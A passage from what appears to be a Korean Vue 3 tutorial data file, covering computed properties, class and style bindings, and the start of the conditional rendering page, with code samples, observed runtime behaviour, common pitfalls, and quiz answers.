        body: "const publishedBooksMessage = computed(() => author.books.length > 0 ? 'Yes' : 'No'). computed는 ref를 돌려줘 .value로 읽고 템플릿에서 풀립니다. 'getter 안에서 읽은 반응형 의존을 추적해, 의존이 바뀌지 않았으면 캐시된 값을 돌려준다'. 같은 결과를 메서드로 만들면 리렌더마다 다시 돕니다. 캐시가 필요 없으면 메서드. 쓰기 가능 computed: computed({ get: () => …, set: (v) => { … } }). 이전 값: 3.4+ getter의 첫 인자 (previous). 모범 사례: 'getter 안에서 다른 상태를 바꾸거나, 비동기 요청을 하거나, DOM을 바꾸지 말 것'. 'computed의 반환값은 읽기 전용으로 다루고 절대 바꾸지 말 것'(배열을 돌려주면 그 배열을 고치지 말고 원본 상태를 고침). API 참고서가 덧붙이는 것: 3.4+ 안정성, computed는 '계산된 값이 이전과 다를 때만' 의존하는 효과를 깨웁니다. 매번 새 객체를 돌려주는 computed는 늘 다르다고 보아 매번 깨웁니다. 디버깅 옵션 onTrack·onTrigger는 Composition API computed에서만.",
        code: "import { computed } from 'vue'\n\nconst fullName = computed(() => `${first.value} ${last.value}`)   // 읽기 전용 · 캐시\nfullName.value = 'x'   // ✗ warn: Write operation failed: computed value is readonly\n\nconst fullName2 = computed({                                       // 쓰기 가능\n  get: () => `${first.value} ${last.value}`,\n  set: (v) => { [first.value, last.value] = v.split(' ') },\n})\n\nconst stable = computed((prev) => { const n = count.value; return n < 3 ? n : prev })   // 3.4+ 이전 값\n\n// ✗ 부수 효과 · 원본 변경\nconst sorted = computed(() => list.value.sort())        // 원본이 정렬됨 (실제로)\nconst sorted2 = computed(() => [...list.value].sort())  // ✓ 복사 뒤\n\n// 비반응형만 읽으면 영원히 처음 값\nconst now = computed(() => Date.now())   // 다시 계산할 이유가 없다",
        terms: [
          {
            term: "지연 평가 (lazy evaluation)와 캐시",
            body: "computed는 만들 때 계산하지 않고 누군가 .value를 읽을 때 처음 계산합니다(실제로 생성 직후 runs 0). 계산 결과는 캐시되어 의존이 바뀌기 전까지 다시 읽어도 재계산하지 않습니다(두 번 읽어도 runs 1). 의존이 바뀌면 '더럽다'고 표시만 해 두고, 다음에 읽을 때 다시 계산합니다(바꾸고 읽기 전 runs 1, 읽은 뒤 2). 그래서 아무도 읽지 않는 computed는 의존이 아무리 바뀌어도 계산되지 않습니다.",
          },
          {
            term: "computed 안정성 (3.4+)",
            body: "computed가 다시 계산됐더라도 결과가 이전과 같으면(Object.is) 그것에 의존하는 효과를 깨우지 않는 규칙입니다. 실제로 돌려 보면 isEven computed는 n이 1→3→5→6으로 네 번 바뀌어도 값이 바뀐 한 번만 효과를 깨웠고(runs 2), 매번 새 객체 { even }을 돌려주는 computed는 값이 같아도 참조가 달라 매번 깨웠습니다(runs 3). 성능 페이지가 '객체를 돌려주는 computed는 바뀌지 않았으면 이전 값을 그대로 돌려주라'고 하는 이유입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 const c = computed(() => { runs++; return a.value * 2 })를 만들고 지켜봤습니다. 생성 직후 runs 0. c.value를 두 번 읽은 뒤 runs 1. a.value = 2로 바꾸고 아직 읽지 않았을 때 runs 1. 읽으니 runs 2, 값 4. c.value = 10을 하니 던지지 않고 '[Vue warn] Write operation failed: computed value is readonly'. { get, set } computed에 쓰니 setter가 돌아 a가 7. reactive([3, 1, 2])를 computed 안에서 arr.sort()하니 원본 arr가 [1, 2, 3]으로 바뀌었고 [...arr].sort()는 바꾸지 않았습니다. 안정성: n이 1→3→5→6일 때 computed(() => n % 2 === 0)에 의존하는 효과는 초기 1회 + 값이 바뀐 6에서 1회 = 2회. 같은 n 변화에 computed(() => ({ even }))는 8, 10에서도 새 객체라 효과 3회(초기 + 2). 서버에서는 computed도 계산되지만 갱신 추적은 없습니다.",
        code: "// Node 24 · vue 3.5.45\nconst c = computed(() => { runs++; return a.value * 2 })\n생성 직후 runs 0 → c.value c.value → runs 1 → a.value = 2 → runs 1 (읽기 전) → c.value → runs 2 · value 4\nc.value = 10 → warn: Write operation failed: computed value is readonly   (던지지 않음)\ncomputed({ get, set }).value = 7 → a === 7\n\ncomputed(() => arr.sort()).value → arr 원본 [1, 2, 3] 으로 바뀜      [...arr].sort() → 원본 유지\n\n// 안정성 (3.4+)\nisEven = computed(() => n % 2 === 0); n: 1 → 3 → 5 → 6     → 의존 효과 runs 2 (초기 + 6 에서)\nobjC = computed(() => ({ even }));  n: 6 → 8 → 10            → 의존 효과 runs 3 (매번 새 객체)",
      },
      {
        label: "문제: 정렬 버튼을 누르자 원본 목록까지 뒤집혔다",
        body: "const sorted = computed(() => items.value.sort((a, b) => a.price - b.price))로 정렬 뷰를 만들었습니다. 다른 탭의 '입력 순' 목록도 정렬돼 있습니다. Array.prototype.sort와 reverse는 원본을 바꾸는 메서드입니다. computed getter 안에서 부르면 반응형 원본이 바뀌고, 그것은 다른 곳에서도 보입니다. 실제로 돌려 보면 computed 안의 arr.sort()가 reactive 배열 원본을 [1, 2, 3]으로 바꿨습니다. 문서의 'getter는 부수 효과가 없어야 한다'와 리스트 페이지의 'reverse()와 sort()에 주의'가 이 자리입니다. 처방은 복사 뒤 정렬입니다. [...items.value].sort(…) 또는 items.value.toSorted(…). computed의 반환값도 읽기 전용으로 다뤄 그 배열을 push하지 않습니다. 바꿀 것은 원본 상태입니다.",
      },
      {
        label: "문제가 나는 경우: 캐시와 순수성을 모를 때",
        body: "경우 ㄱ, getter 안 sort·reverse·splice입니다. 위의 사고입니다. 경우 ㄴ, getter 안 비동기(fetch). computed는 동기 값만. 결과를 ref에 담는 watch·컴포저블로. 경우 ㄷ, getter 안에서 다른 state를 set. 재계산마다 부수 효과, 무한 루프 가능. watch로. 경우 ㄹ, Date.now()·Math.random()만 읽는 computed. 다시 계산되지 않습니다. 메서드나 반응형 소스. 경우 ㅁ, 읽기 전용 computed에 대입. 경고 후 무시(실제로). { get, set } 또는 원본 변경. 경우 ㅂ, 캐시가 필요 없는데 computed. 메서드가 더 단순(인자도 받음). 경우 ㅅ, 매번 새 객체·배열을 돌려주는 computed에 많은 효과가 의존. 안정성이 깨져 매번 깨움(실제로 runs 3). 이전 값(prev)을 비교해 같으면 prev 반환. 경우 ㅇ, computed 반환 배열을 직접 push. 다음 재계산에 사라지고 원본과 어긋남. 원본을 바꾼다. 경우 ㅈ, 템플릿에서 computed를 함수처럼 호출(fullName()). computed는 ref라 호출 불가. {{ fullName }}. 경우 ㅊ, Options API에서 computed에 화살표 함수를 쓰고 this를 기대. this 없음. 일반 함수 또는 첫 인자 vm. 경우 ㅋ, 아무도 읽지 않는 computed로 부수 효과를 기대. 읽히지 않으면 계산 자체가 안 됨(지연). watchEffect로. 경우 ㅌ, 서버 렌더에서 computed가 갱신될 거라 기대. 서버는 추적이 꺼짐.",
        code: "경우               언제 생기나                        겉모습                                    처방\nㄱ 원본 변이        computed 안 sort/reverse            다른 뷰도 바뀜 (실제로)                      [...arr].sort() · toSorted\nㄴ 비동기 getter     computed(async …)                  Promise 가 값                              watch + ref · 컴포저블\nㄷ 상태 변경        getter 안 set                        부수 효과 · 루프                             watch\nㄹ 비반응 소스       Date.now() 만                       처음 값 고정                               메서드 · 반응형 소스\nㅁ 읽기 전용 대입     c.value = x                        Write operation failed: computed value is readonly   get/set\nㅂ 불필요 캐시       인자 필요한 변환                     computed 로 못 함                           메서드\nㅅ 새 객체 반환       computed(() => ({…}))              의존 효과 매번 (runs 3)                      prev 비교 후 반환\nㅇ 반환값 변이       sorted.value.push(x)                재계산에 사라짐                             원본 변경\nㅈ 함수처럼 호출      {{ fullName() }}                   에러                                      {{ fullName }}\nㅊ 화살표 this       computed: { f: () => this.x }       undefined                                 일반 함수 · vm 인자\nㅋ 안 읽는 computed   부수 효과 기대                      계산 안 됨 (지연)                           watchEffect\nㅌ 서버 갱신 기대     SSR computed                       처음 계산만                                -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: computed 는 '읽는 쪽이 당기는' 순수 함수 캐시다",
        body: "computed의 성질 셋이 사고를 전부 설명합니다. 첫째, 당김(pull). 읽을 때 계산하고 안 읽으면 안 합니다(ㅋ). 둘째, 캐시. 의존이 바뀌기 전엔 재계산하지 않고(ㄹ), 재계산해도 값이 같으면 아래를 깨우지 않습니다(ㅅ). 셋째, 순수. 계산만 하고 바깥을 바꾸지 않아야 캐시가 안전합니다(ㄱ, ㄴ, ㄷ). 읽기 전용(ㅁ)과 반환값 불변(ㅇ)은 그 순수성의 다른 면입니다. 메서드는 셋 다 아니라서(매번 돌고, 캐시 없고, 뭐든 해도 됨) 인자가 필요하거나 캐시가 무의미한 자리에 맞습니다(ㅂ). 처방은 '이 값은 다른 상태로 계산되나, 그리고 그 계산은 바깥을 안 건드리나'를 묻는 것입니다. 둘 다 예면 computed, 바깥을 건드려야 하면 watch, 인자가 필요하면 메서드.",
        code: "computed = 당김(읽을 때) + 캐시(의존 바뀔 때만 · 값 같으면 안 깨움) + 순수(바깥 안 건드림)\n  당김   → 안 읽으면 계산 X (ㅋ)\n  캐시   → 비반응 소스면 고정 (ㄹ) · 새 객체면 안정성 깨짐 (ㅅ)\n  순수   → sort/fetch/set 금지 (ㄱ ㄴ ㄷ) · 읽기 전용 (ㅁ) · 반환값 불변 (ㅇ)\n\n다른 상태로 계산되나? + 바깥 안 건드리나? → computed  /  바깥을 건드려야 → watch  /  인자 필요 → 메서드",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "값을 만들었으니 화면에 붙입니다. 다음 페이지 '클래스와 스타일 바인딩'. 실제로 돌려 보면 컴포넌트 루트의 class는 부모가 넘긴 것과 'base extra'로 병합됐고, 루트가 둘이면 'Extraneous non-props attributes (class)…' 경고였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 검색어로 거른 목록 filtered와, 그 목록을 가격순으로 정렬한 sorted를 만들려 합니다. 어떻게 쓰고 무엇을 조심할까요? (2) 장바구니 합계가 바뀔 때마다 서버에 로그를 보내려 computed 안에 fetch를 넣었습니다. 왜 안 되고 어떻게? (3) 큰 테이블의 각 행이 computed(() => ({ selected: id === sel.value }))에 의존해 매 선택마다 전부 다시 그려집니다. 왜이고 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) const filtered = computed(() => items.value.filter(i => i.name.includes(q.value))); const sorted = computed(() => [...filtered.value].sort((a, b) => a.price - b.price)). filter는 새 배열을 돌려주지만 sort는 제자리라 꼭 복사(또는 toSorted) 뒤 정렬합니다. 실제로 돌려 보면 computed 안의 sort가 원본을 바꿨습니다. 둘 다 읽기 전용으로 다루고, 항목을 바꿀 때는 items를 바꿉니다. (2) computed는 동기 계산만 하고, getter 안의 부수 효과는 재계산 때마다 돌아 로그가 중복되거나 안 읽히면 안 돕니다(지연). '언제 바뀌었나에 반응해 바깥을 건드리는 일'은 watch(total, (v) => sendLog(v))입니다. total 자체는 computed로 두고요. (3) 매번 새 객체를 돌려주는 computed는 값이 같아도 참조가 달라 3.4의 안정성이 작동하지 않고 모든 의존 효과를 깨웁니다(실제로 runs 3). 두 처방. 불리언 하나를 돌려주는 computed(() => id === sel.value)로 바꾸면 값이 바뀐 행만 깨어납니다(실제로 runs 2). 또는 getter에서 이전 값과 비교해 같으면 prev를 돌려줍니다. 성능 페이지는 거기에 더해 선택 비교를 부모에서 한 번 하고 자식에 :active=\"item.id === activeId\"로 불리언만 넘기라고 적습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Computed Properties", href: `${DOCS}/guide/essentials/computed` },
      { label: "computed()", href: `${DOCS}/api/reactivity-core#computed` },
      { label: "Performance — Computed Stability", href: `${DOCS}/guide/best-practices/performance#computed-stability` },
    ],
  },

  {
    id: "vg-ess-class-style",
    name: "클래스와 스타일 바인딩",
    tagline: ":class 와 :style 에 객체·배열을 넘기면 Vue 가 문자열로 합쳐 준다 — 단일 루트에는 병합, 다중 루트에는 손으로",
    intro:
      "필수 개념 다섯째 페이지입니다. class와 style은 자주 동적으로 바뀌는 속성이라 v-bind가 특별 취급합니다. 문자열 대신 객체({ active: isActive })와 배열([activeClass, errorClass])을 받아 합칩니다. 정적 class와 :class는 병합되고, 컴포넌트에 넘긴 class는 단일 루트 요소에 병합되며, 루트가 여럿이면 어디에 붙일지 $attrs.class로 직접 정해야 합니다. style은 camelCase 키의 객체(kebab도 됨), 벤더 프리픽스는 런타임이 감지해 붙이고, 배열 값은 브라우저가 지원하는 마지막 값만 렌더됩니다. 실제로 돌려 보면 컴포넌트 루트의 class=\"base\"와 부모의 class=\"extra\"가 'base extra'로 병합됐고, 루트가 둘인 컴포넌트에 class를 넘기니 'Extraneous non-props attributes (class) were passed to component but could not be automatically inherited because component renders fragment or text or teleport root nodes.' 경고였습니다. 컴파일 출력에서 :class는 _normalizeClass로 감싸이고 CLASS 패치 플래그가 붙었습니다. 이 노드의 질문은 하나입니다. 합쳐 주는 자리와 손으로 해야 하는 자리는 어디인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: ":class 객체 문법 <div :class=\"{ active: isActive, 'text-danger': hasError }\">는 값이 truthy인 키만 클래스가 됩니다. 정적 class=\"static\"과 함께 쓰면 병합. 객체를 데이터나 computed로 미리 만들어 넘기는 패턴이 권장. 배열 문법 <div :class=\"[activeClass, errorClass]\">는 각 항목을 클래스로, 항목에 삼항이나 객체를 섞을 수 있습니다. 컴포넌트에 class를 넘기면 '단일 루트 요소에 추가되고 기존 class와 병합'. 다중 루트면 자동 적용되지 않고 어느 요소가 받을지 :class=\"$attrs.class\"로 정합니다. :style은 객체 <div :style=\"{ color: activeColor, fontSize: fontSize + 'px' }\">. camelCase 권장, 'font-size' 같은 kebab도 됩니다. 스타일 객체를 데이터로 두거나 배열로 여럿을 병합. 벤더 프리픽스가 필요한 속성은 런타임이 브라우저 지원을 보고 붙입니다. 한 속성에 배열 값 display: ['-webkit-box', '-ms-flexbox', 'flex']를 주면 브라우저가 지원하는 마지막 값만 렌더됩니다.",
        code: "<!-- 객체 · 정적과 병합 -->\n<div class=\"static\" :class=\"{ active: isActive, 'text-danger': hasError }\"></div>\n→ <div class=\"static active\"></div>   (isActive true · hasError false)\n\n<!-- 배열 · 삼항 · 객체 섞기 -->\n<div :class=\"[isActive ? activeClass : '', errorClass]\"></div>\n<div :class=\"[{ [activeClass]: isActive }, errorClass]\"></div>\n\n<!-- computed 로 미리 -->\nconst classObject = computed(() => ({ active: isActive.value && !error.value, 'text-danger': error.value?.type === 'fatal' }))\n\n<!-- 컴포넌트에 넘기면 단일 루트에 병합 -->\n<MyComponent class=\"baz\" />   <!-- 자식 루트 <p class=\"foo bar\"> → <p class=\"foo bar baz\"> -->\n<!-- 다중 루트는 손으로 -->\n<p :class=\"$attrs.class\">Hi</p><span>…</span>\n\n<!-- style -->\n<div :style=\"{ color: activeColor, fontSize: fontSize + 'px' }\"></div>   <!-- camelCase · 'font-size' 도 됨 -->\n<div :style=\"[baseStyles, overridingStyles]\"></div>\n<div :style=\"{ display: ['-webkit-box', '-ms-flexbox', 'flex'] }\"></div>   <!-- 지원하는 마지막 값만 -->",
        terms: [
          {
            term: "normalizeClass · normalizeStyle",
            body: "템플릿의 :class와 :style을 컴파일할 때 Vue가 감싸는 런타임 함수입니다. 문자열·객체·배열(중첩 포함)을 받아 하나의 클래스 문자열 / 스타일 객체로 합칩니다. 실제로 컴파일 출력에서 <p :class=\"c\">는 { class: _normalizeClass(_ctx.c) }였습니다. 그래서 :class에는 무엇을 넘겨도 되고, 컴포넌트에 넘긴 class가 자식 루트의 class와 병합되는 것도 이 정규화가 둘을 합치기 때문입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 루트가 <button class=\"base\">인 컴포넌트에 <Btn class=\"extra\" />로 넘기니 DOM의 className은 'base extra'였습니다. 자식의 정적 class와 부모의 class가 병합됩니다. 루트가 <p>a</p><p>b</p> 둘인 컴포넌트에 class=\"x\"를 넘기니 어디에도 붙지 않고 '[Vue warn]: Extraneous non-props attributes (class) were passed to component but could not be automatically inherited because component renders fragment or text or teleport root nodes.'가 났습니다. 같은 컴포넌트에 @click도 넘기니 'Extraneous non-emits event listeners (click) were passed to component but could not be automatically inherited because component renders fragment or text root nodes…'가 더 났습니다. 서버 렌더(renderToString)에서도 같은 경고와 함께 <!--[--><p>a</p><p>b</p><!--]-->(프래그먼트 표시)가 나왔습니다. Node의 컴파일 출력에서 :class=\"c\"는 class: _normalizeClass(_ctx.c)와 패치 플래그 CLASS(2)로, 텍스트도 동적이면 3 /* TEXT, CLASS */로 '클래스와 텍스트만 비교'가 표시됐습니다. 정적 class만 있는 요소는 -1 /* CACHED */로 캐시됩니다.",
        code: "// Chrome 156\n<Btn class=\"extra\" />  (루트 <button class=\"base\">)   → className 'base extra'\n<Multi class=\"x\" @click=\"…\" />  (루트 <p>a</p><p>b</p>)\n  → warn: Extraneous non-props attributes (class) were passed to component but could not be automatically inherited because component renders fragment or text or teleport root nodes.\n  → warn: Extraneous non-emits event listeners (click) were passed to component but could not be automatically inherited because component renders fragment or text root nodes…\n\n// Node — SSR 다중 루트\nrenderToString(<Multi class=\"x\">) → <!--[--><p>a</p><p>b</p><!--]-->  + 같은 경고\n\n// 컴파일 출력\n<p :class=\"c\">{{ msg }}</p> → { class: _normalizeClass(_ctx.c) }, _toDisplayString(_ctx.msg), 3 /* TEXT, CLASS */\n<p class=\"static\">정적</p>   → _cache[…] … -1 /* CACHED */",
      },
      {
        label: "문제: 래퍼 컴포넌트에 넘긴 class 가 사라지고 경고가 뜬다",
        body: "<Card class=\"mt-4\" />를 썼는데 여백이 안 들어가고 'Extraneous non-props attributes (class)…' 경고가 있습니다. Card의 템플릿이 <header>…</header><section>…</section>처럼 루트가 둘입니다. 폴스루 속성(class·style·리스너)은 '단일 루트'에만 자동으로 붙습니다. 루트가 여럿이면 Vue가 어디에 붙일지 모르니 경고만 남깁니다. 실제로 돌려 보면 그렇게 사라졌습니다. 처방은 둘입니다. 루트를 하나로 감싸거나(<div class=\"card\"><header/><section/></div>), 어느 요소가 받을지 명시합니다. <section v-bind=\"$attrs\"> 또는 :class=\"$attrs.class\". 명시하면 경고도 사라집니다. inheritAttrs: false와 함께 쓰면 루트가 하나여도 손으로 배치할 수 있습니다(폴스루 속성 페이지).",
      },
      {
        label: "문제가 나는 경우: 병합 규칙을 모를 때",
        body: "경우 ㄱ, 다중 루트 컴포넌트에 class입니다. 위의 사고입니다. 경우 ㄴ, 정적 class를 :class가 덮을 거라 기대. 병합됩니다. 지우려면 조건을 객체 안으로. 경우 ㄷ, 클래스 이름에 하이픈을 객체 키로 그냥 씁니다. { text-danger: x }는 문법 에러. 따옴표 'text-danger'. 경우 ㄹ, 템플릿 안에 긴 객체를 인라인. 읽기 어렵고 갱신마다 새 객체. computed로. 경우 ㅁ, style에 숫자만 넘깁니다. fontSize: 14는 '14'(단위 없음). React와 달리 px를 안 붙입니다. '14px'. 경우 ㅂ, style 문자열을 :style에. :style=\"'color: red'\"는 되지만 병합·정규화 이점이 없음. 객체로. 경우 ㅅ, 벤더 프리픽스를 손으로. 런타임이 붙여 줍니다. 경우 ㅇ, display 배열 값이 전부 나올 거라 기대. 지원하는 마지막 값 하나만. 경우 ㅈ, 자식의 class가 부모 것보다 '뒤'에 와서 우선하길 기대. 순서는 병합 순서일 뿐, CSS 우선순위는 명시도·선언 순서입니다. 경우 ㅊ, 컴포넌트에 class를 넘겼는데 자식이 inheritAttrs: false입니다. 어디에도 안 붙음. $attrs.class를 손으로. 경우 ㅋ, 조건 클래스 토글이 많아 성능 걱정. CLASS 플래그로 클래스만 비교하니 보통 문제 없음.",
        code: "경우               언제 생기나                       겉모습                                         처방\nㄱ 다중 루트        <Card class> · 루트 둘             사라짐 + Extraneous non-props attributes (class)    루트 하나 · $attrs.class\nㄴ 덮기 기대        class=\"a\" :class=\"'b'\"           'a b' (병합)                                  객체 안 조건\nㄷ 하이픈 키        { text-danger: x }                 문법 에러                                     'text-danger'\nㄹ 인라인 객체       긴 { … } 템플릿에                   가독성 · 갱신마다 새 객체                         computed\nㅁ 숫자 style       fontSize: 14                       '14' (단위 없음)                               '14px'\nㅂ 문자열 style      :style=\"'color:red'\"              병합 X                                        객체\nㅅ 손 프리픽스       -webkit- 직접                      중복                                         런타임 자동\nㅇ 배열 전부 기대     display: [a, b, c]                 마지막 지원 값 하나                              -\nㅈ CSS 우선 혼동     병합 순서로 우선 기대                명시도·선언 순서가 결정                           CSS 쪽\nㅊ inheritAttrs:false  자식이 끔                        안 붙음                                       $attrs.class 명시\nㅋ 성능 걱정        토글 많음                           CLASS 플래그로 클래스만 비교                        -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: class·style 은 '합치는 속성' 이고, 합칠 자리가 하나여야 자동이다",
        body: "보통 속성은 하나의 값이라 바인딩이 그대로 대입됩니다. class와 style은 여러 출처(정적, :class, 부모가 넘긴 것, 자식 루트의 것)가 '합쳐지는' 속성이라 Vue가 normalizeClass·normalizeStyle로 정규화해 병합합니다(ㄴ, ㅂ). 병합은 자동이되 '어디에'가 정해져야 합니다. 요소 자신이면 그 요소, 컴포넌트면 단일 루트. 루트가 여럿이거나 inheritAttrs가 꺼지면 자리가 없어 경고와 함께 버려지고 $attrs로 손으로 둡니다(ㄱ, ㅊ). 그리고 병합은 '문자열 합치기'라 CSS의 우선순위와는 무관하고(ㅈ) 단위도 안 붙입니다(ㅁ). 처방은 class·style을 '객체로 만들어 넘기면 Vue가 합친다, 단 자리가 하나여야'로 기억하는 것입니다.",
        code: "출처:  정적 class · :class (객체·배열) · 부모가 넘긴 class · 자식 루트 class\n  ──normalizeClass──▶ 하나의 문자열 (병합 ㄴ) · CLASS 플래그로 그것만 비교 (ㅋ)\n자리:  요소 자신  /  컴포넌트의 단일 루트 (자동)  /  다중 루트 · inheritAttrs:false → 자리 없음 → 경고 + $attrs 로 손으로 (ㄱ ㅊ)\n병합 ≠ CSS 우선순위 (ㅈ) · 단위 안 붙임 (ㅁ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '조건부 렌더링'은 v-if(제거·생성)와 v-show(display)입니다. 실제로 돌려 보면 v-if가 false면 요소가 DOM에서 사라졌고 v-show는 display: none이었으며, v-if/v-else 분기에 같은 key를 주면 컴파일 에러 'v-if/else branches must use unique keys.'였습니다.",
      },
      {
        label: "확인 질문",
        body: "버튼 컴포넌트 BaseButton(루트 <button class=\"btn\">)이 있습니다. (1) <BaseButton class=\"btn-lg\" />의 결과 class는? (2) 변형을 size·variant prop으로 받아 'btn btn-lg btn-primary'를 만들려면 어떻게? (3) 이 버튼을 <button>과 <span class=\"hint\"> 두 루트로 바꿨더니 class가 사라졌습니다. 왜고 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) 'btn btn-lg'. 단일 루트의 정적 class와 부모가 넘긴 class가 병합됩니다. 실제로 돌려 보면 'base extra'로 합쳐졌습니다. (2) 템플릿에 <button class=\"btn\" :class=\"[`btn-${size}`, `btn-${variant}`]\"> 또는 computed로 const classes = computed(() => ({ [`btn-${props.size}`]: true, [`btn-${props.variant}`]: true }))를 만들어 :class=\"classes\". 부모가 넘긴 class도 그 위에 병합되므로 셋이 합쳐집니다. 템플릿 인라인보다 computed가 읽기 쉽고 갱신마다 객체를 새로 만들지 않습니다. (3) 루트가 둘이면 폴스루 class를 어디에 붙일지 Vue가 모릅니다. 경고 'Extraneous non-props attributes (class)…'와 함께 버려집니다(실제로 확인). <button v-bind=\"$attrs\" class=\"btn\">처럼 받을 요소를 명시합니다. 리스너(@click)도 같은 이유로 사라지므로 v-bind=\"$attrs\"로 함께 넘기는 것이 안전합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Class and Style Bindings", href: `${DOCS}/guide/essentials/class-and-style` },
      { label: "Fallthrough Attributes", href: `${DOCS}/guide/components/attrs` },
    ],
  },

  {
    id: "vg-ess-conditional",
    name: "조건부 렌더링",
    tagline: "v-if 는 없애고 다시 만들고, v-show 는 숨기기만 한다",
    intro:
      "필수 개념 여섯째 페이지입니다. v-if·v-else-if·v-else는 조건이 거짓이면 요소를 DOM에서 제거하고(자식 컴포넌트 언마운트, 리스너 해제), 참이 되면 다시 만듭니다. 지연적이라 처음 거짓이면 아무것도 안 합니다. <template v-if>는 보이지 않는 묶음. v-else는 v-if·v-else-if '바로 다음 형제'여야 합니다. v-show는 늘 렌더하고 CSS display만 토글합니다. <template>과 v-else를 지원하지 않습니다. 자주 토글하면 v-show, 조건이 런타임에 잘 안 바뀌면 v-if. v-if와 v-for를 한 요소에 두는 것은 '암묵적 우선순위 때문에 권장하지 않음'(v-if가 먼저). 실제로 돌려 보면 v-if false는 요소 제거, v-show false는 style display: none이었고, v-if/v-else 분기에 같은 key를 주니 컴파일 에러 'v-if/else branches must use unique keys.'였으며, v-if로 컴포넌트를 없애면 unmounted 훅이 돌았습니다. 이 노드의 질문은 하나입니다. 없애는가, 숨기는가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<h1 v-if=\"awesome\">Vue is awesome!</h1><h1 v-else>Oh no 😢</h1>. v-else-if로 체인. 'v-else 요소는 v-if나 v-else-if 요소 바로 다음에 와야 한다. 아니면 인식되지 않는다'. 여러 요소를 한 조건으로 묶으려면 <template v-if=\"ok\">…</template>(렌더 결과에 template은 없음). v-else·v-else-if도 <template>에 됩니다. v-show는 <h1 v-show=\"ok\">로 요소는 늘 DOM에 있고 display CSS만 토글, 초기 display 값을 존중합니다. '<template>을 지원하지 않고 v-else와도 안 됨'. 비교: v-if는 '진짜' 조건부 렌더링(이벤트 리스너·자식 컴포넌트가 제거·재생성), 지연적(처음 거짓이면 렌더 안 함). v-show는 초기 렌더 비용이 더 들지만 토글이 쌉니다. 'v-if와 v-for를 같은 요소에 두는 것은 암묵적 우선순위 때문에 권장하지 않음'. 리스트 페이지가 v-if가 v-for보다 먼저 평가되어 v-for 변수를 못 읽는다고 적습니다.",
        code: "<h1 v-if=\"awesome\">Vue is awesome!</h1>\n<h1 v-else-if=\"meh\">Meh</h1>\n<h1 v-else>Oh no 😢</h1>              <!-- 바로 다음 형제여야 -->\n\n<template v-if=\"ok\">                  <!-- 보이지 않는 묶음 · 결과에 template 없음 -->\n  <h1>Title</h1>\n  <p>Paragraph</p>\n</template>\n\n<h1 v-show=\"ok\">Hello!</h1>           <!-- 늘 DOM 에 · display 토글 · <template> · v-else 불가 -->\n\n<!-- ✗ 같은 요소에 v-if + v-for — v-if 가 먼저라 todo 를 못 읽음 -->\n<li v-for=\"todo in todos\" v-if=\"!todo.isComplete\">\n<!-- ✓ -->\n<template v-for=\"todo in todos\" :key=\"todo.id\"><li v-if=\"!todo.isComplete\">…</li></template>\n<li v-for=\"todo in activeTodos\" :key=\"todo.id\">   <!-- computed 로 미리 거름 -->",
        terms: [
          {
            term: "<template> 묶음",
            body: "렌더 결과에 나타나지 않는 보이지 않는 래퍼입니다. v-if·v-else-if·v-else·v-for·v-slot과 함께 쓸 때만 특별하고, 디렉티브 없이 쓰면 네이티브 <template> 요소로 렌더됩니다(실제로 컴파일 출력에 \"template\" 태그가 남음). v-for와 쓸 때 key는 <template>에 둡니다. 같은 조건으로 요소 여럿을 묶되 불필요한 <div>를 만들지 않을 때 씁니다. v-show는 <template>에 쓸 수 없습니다. display를 토글할 요소가 없기 때문입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 <p id=\"vif\" v-if=\"show\">와 <p id=\"vshow\" v-show=\"show\">를 두고 show를 false로 바꾸니 #vif는 querySelector가 null(제거됨), #vshow는 남아 있고 style.display가 'none'이었습니다. 컴포넌트를 v-if로 없애니 자식의 beforeUnmount → unmounted 훅이 돌았습니다(라이프사이클 측정). Node의 컴파일러에서 <template v-if=\"a\" key=\"k\">a</template><template v-else key=\"k\">b</template>는 에러 'v-if/else branches must use unique keys.'. 같은 요소에 v-for와 v-if를 둔 템플릿은 3.5.45 컴파일러가 경고 없이 통과했습니다(문서는 비권장이고 런타임에 v-for 변수를 못 읽는 에러가 난다고 적음). <template v-show>는 컴파일 에러는 없었지만 문서대로 지원되지 않습니다. 디렉티브 없는 <template>은 네이티브 template 요소로 컴파일됩니다. Transition과 함께 v-if를 토글하니 enter·leave 클래스가 붙었습니다(내장 컴포넌트 노드).",
        code: "// Chrome 156\nshow = false:  #vif → null (DOM 에서 제거)   #vshow → style.display 'none' (남아 있음)\nv-if 로 컴포넌트 제거 → child beforeUnmount → child unmounted\n\n// Node — 컴파일\n<template v-if=\"a\" key=\"k\">…</template><template v-else key=\"k\">…</template>  → error: v-if/else branches must use unique keys.\n<div v-for=\"i in list\" v-if=\"i.ok\">   → 3.5.45 컴파일 통과 (경고 없음) · 문서: 비권장 · 런타임에 i 를 못 읽음\n<template><p>a</p></template>         → 네이티브 \"template\" 요소로 렌더\n<template v-show=\"a\">                 → 컴파일 에러 없음 · 문서: 미지원",
      },
      {
        label: "문제: 탭을 바꿀 때마다 입력한 내용이 사라진다",
